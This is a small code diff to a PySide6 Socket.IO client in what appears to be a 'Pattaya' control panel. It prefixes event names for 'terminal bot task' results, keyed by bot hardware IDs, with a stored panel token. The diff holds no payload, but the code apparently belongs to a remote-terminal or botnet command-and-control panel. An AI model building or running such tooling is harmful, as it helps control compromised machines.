@@ -1,4 +1,4 @@
-from PySide6.QtCore import QObject, Signal
+from PySide6.QtCore import QObject, Signal,QSettings
 import socketio
 
 from core.util import PattayaPanelUtil
@@ -16,9 +16,9 @@ class SocketIOTerminalClient(QObject):
         super().__init__()
 
         self.bot = bot
-
-        self.bot_event_ack = f'server_ack_terminal_bot_task_result_{self.bot["hwid"]}'
-        self.bot_event_result = f'panel_terminal_bot_task_result_{self.bot["hwid"]}'
+        self.panel_token = QSettings("unknownclub.net", "Pattaya").value('token')
+        self.bot_event_ack = f'{self.panel_token}_server_ack_terminal_bot_task_result_{self.bot["hwid"]}'
+        self.bot_event_result = f'{self.panel_token}_panel_terminal_bot_task_result_{self.bot["hwid"]}'
         self.bot_event_bot_discon = f'panel_terminal_bot_seem_disconnected_{self.bot["socketId"]}'
 
         self.socket_io = socketio.Client()
